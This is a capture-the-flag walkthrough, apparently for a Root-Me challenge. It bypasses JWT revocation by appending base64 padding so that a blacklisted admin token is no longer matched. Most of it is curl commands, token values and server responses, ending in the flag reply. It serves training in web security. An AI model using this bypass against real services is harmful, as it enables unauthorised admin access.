
For this challenge, we need to access the admin endpoint, but there's a twist - tokens are immediately revoked after creation.

Let's start by getting a token:

```bash
curl -H "Content-Type: Application/json" -X POST -d '{"username":"admin","password":"admin"}' http://challenge01.root-me.org/web-serveur/ch63/login
```

Response:

```json
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3Njc3OTkwNjYsIm5iZiI6MTc2Nzc5OTA2NiwianRpIjoiZGJiZWE2NDEtZjNjMS00N2E2LTg1YjEtYWM4Nzc3YjY4YWZhIiwiZXhwIjoxNzY3Nzk5MjQ2LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.uryxk-Pr96M7L2doYbpEqfQ7u0E9Eklz7Tj6bCDWjxw"}
```

Now let's try to access the admin endpoint with this token:

```bash
curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3Njc3OTkwNjYsIm5iZiI6MTc2Nzc5OTA2NiwianRpIjoiZGJiZWE2NDEtZjNjMS00N2E2LTg1YjEtYWM4Nzc3YjY4YWZhIiwiZXhwIjoxNzY3Nzk5MjQ2LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.uryxk-Pr96M7L2doYbpEqfQ7u0E9Eklz7Tj6bCDWjxw" http://challenge01.root-me.org/web-serveur/ch63/admin
```

Response:

```json
{"msg":"Token is revoked"}
```

The token gets revoked immediately after creation. Looking at the code, the developer is blacklisting the entire JWT string instead of just the JTI (JWT ID).

## The Vulnerability

The issue is an **inconsistency in padding handling**:

1. **Token created**: `eyJ0eX...jxw` (no padding, stored in blacklist)
2. **JWT validation** (`@jwt_required`): Strips padding internally - accepts both `eyJ0eX...jxw` and `eyJ0eX...jxw=` as the same token
3. **Blacklist check**: Uses raw string comparison - treats `eyJ0eX...jxw` and `eyJ0eX...jxw=` as different strings

So by adding = padding, we create a different string that passes JWT validation but bypasses the blacklist check!

Let's try adding = at the end:

```bash
curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3Njc3OTkwNjYsIm5iZiI6MTc2Nzc5OTA2NiwianRpIjoiZGJiZWE2NDEtZjNjMS00N2E2LTg1YjEtYWM4Nzc3YjY4YWZhIiwiZXhwIjoxNzY3Nzk5MjQ2LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.uryxk-Pr96M7L2doYbpEqfQ7u0E9Eklz7Tj6bCDWjxw=" http://challenge01.root-me.org/web-serveur/ch63/admin
```

Response:

```json
{"Congratzzzz!!!_flag:":"#!@&#!@&#!@&#!@&#!@&#!@&#!@&#!@&#!@&#!@&#!@&#!@&#!@&"}
```

And there you go, you have the flag!

**Note:** In real life, this shouldn't work because RFC 7515 specifies that JWT uses base64url encoding without padding. This vulnerability exists because the JWT library normalizes padding internally (for compatibility), but the application code doesn't normalize before checking the blacklist - creating an inconsistency that can be exploited.